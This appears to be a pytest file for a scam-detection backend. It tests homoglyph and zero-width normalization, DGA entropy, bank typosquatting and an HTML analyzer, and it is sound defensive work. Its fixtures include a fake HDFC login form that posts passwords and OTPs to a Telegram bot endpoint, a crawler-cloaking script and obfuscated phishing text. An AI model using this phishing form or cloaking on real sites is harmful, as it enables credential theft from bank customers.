"""
Unit tests for Adversarial Text Normalization and Zero-Day Domain Intelligence (Phases 1 & 2).
"""

import pytest
import asyncio
from backend.models.evidence import (
    EvidenceItem,
    EvidenceSeverity,
    EvidenceStatus,
    EvidenceType,
    IncidentEvidence,
    InputType,
    RiskDirection,
)
from backend.modules.adversarial_normalizer import (
    calculate_entropy,
    normalize_adversarial_text,
)
from backend.modules.ingestion import extract_iocs
from backend.modules.url_analyzer import analyze_urls


def test_zero_width_and_homoglyph_detection():
    """Verify adversarial normalizer strips hidden chars and de-obfuscates Cyrillic homoglyphs."""
    # Obfuscated message using Cyrillic 'а', 'с', 'о' and zero-width spaces (\u200b)
    obfuscated_msg = "Dear user, your \u0430\u0441\u0441\u043eunt is suspended. Update K.Y.C immediately \u200b"
    
    clean_text, meta, items = normalize_adversarial_text(obfuscated_msg)
    
    assert "account" in clean_text.lower()
    assert "kyc" in clean_text.lower()
    assert meta["obfuscation_detected"] is True
    assert "zero_width_chars_injected" in meta["signals"]
    assert "homoglyphs_detected" in meta["signals"]
    assert "split_keyword_obfuscation" in meta["signals"]
    
    # Check that high-severity pattern match evidence items were created
    assert len(items) == 3
    assert all(item.type == EvidenceType.PATTERN_MATCH for item in items)
    assert any(item.severity == EvidenceSeverity.HIGH for item in items)


def test_ingestion_integrates_adversarial_evidence():
    """Verify extract_iocs populates adversarial evidence items on the IncidentEvidence object."""
    evasive_text = "Important \u200b notice: verify \u0430\u0441\u0441\u043eunt now at https://secure-auth.xyz"
    evidence = IncidentEvidence(input_type=InputType.SMS, message=evasive_text)
    
    evidence = extract_iocs(evidence)
    
    assert "account" in evidence.message
    adversarial_items = [e for e in evidence.evidence if getattr(e, "correlation_group", None) == "adversarial_evasion"]
    assert len(adversarial_items) >= 2


def test_shannon_entropy_calculation():
    """Verify Shannon entropy flags high-randomness DGA domains and spares clean domains."""
    clean_domain = "google"
    dga_domain = "q8z9x7w1m2p0lkj4"
    
    clean_entropy = calculate_entropy(clean_domain)
    dga_entropy = calculate_entropy(dga_domain)
    
    assert dga_entropy > 3.75
    assert clean_entropy < 3.0


def test_zero_day_brand_typosquatting_detection():
    """Verify unverified domain embedding a protected brand is flagged as brand typosquatting."""
    typosquat_url = "https://hdfc-bank-netbanking-portal.top/login"
    evidence = IncidentEvidence(input_type=InputType.URL, message=typosquat_url)
    evidence = extract_iocs(evidence)
    evidence = asyncio.run(analyze_urls(evidence))
    
    url_signals = evidence.urls[0].signals
    assert "brand_typosquatting" in url_signals
    
    typo_items = [e for e in evidence.evidence if getattr(e, "correlation_group", None) == "brand_impersonation"]
    assert len(typo_items) >= 1
    assert typo_items[0].severity == EvidenceSeverity.HIGH
    assert typo_items[0].status == EvidenceStatus.SUSPICIOUS


def test_official_domain_not_flagged_as_typosquatting():
    """Verify verified official domain is NOT falsely marked as typosquatting."""
    official_url = "https://netbanking.hdfcbank.com/netbanking"
    evidence = IncidentEvidence(input_type=InputType.URL, message=official_url)
    evidence = extract_iocs(evidence)
    evidence = asyncio.run(analyze_urls(evidence))
    
    url_signals = evidence.urls[0].signals
    assert "brand_typosquatting" not in url_signals


def test_website_analyzer_exfiltration_webhook_trap():
    """Verify website analyzer flags direct Telegram/Discord credential drop endpoints."""
    from backend.services.website_analyzer import analyze_html_content
    
    scam_html = """
    <html>
        <head><title>HDFC Bank Online Login</title></head>
        <body>
            <form action="https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage" method="POST">
                <input type="password" name="netbanking_password" placeholder="Enter NetBanking Password" />
                <input type="text" name="otp" placeholder="Enter 6-digit OTP" />
                <button type="submit">Verify Now</button>
            </form>
        </body>
    </html>
    """
    analysis, items = analyze_html_content("https://hdfc-verify.top/login", scam_html)
    
    assert analysis["has_password_field"] is True
    assert "otp" in analysis["credential_fields"]
    
    # Check that critical exfiltration evidence was generated
    exfil_items = [e for e in items if getattr(e, "correlation_group", None) == "credential_exfiltration"]
    assert len(exfil_items) >= 1
    assert any(e.severity == EvidenceSeverity.CRITICAL for e in exfil_items)


def test_website_analyzer_anti_cloaking_detection():
    """Verify website analyzer detects anti-bot / crawler evasion scripts."""
    from backend.services.website_analyzer import analyze_html_content
    
    cloaked_html = """
    <html>
        <head>
            <script>
                if (navigator.webdriver) {
                    window.location.href = "https://google.com";
                }
                debugger;
            </script>
        </head>
        <body>Safe looking page</body>
    </html>
    """
    analysis, items = analyze_html_content("https://stealth-scam.xyz", cloaked_html)
    
    cloaking_items = [e for e in items if getattr(e, "correlation_group", None) == "anti_analysis_cloaking"]
    assert len(cloaking_items) >= 1
    assert cloaking_items[0].severity == EvidenceSeverity.HIGH
    assert cloaking_items[0].status == EvidenceStatus.SUSPICIOUS
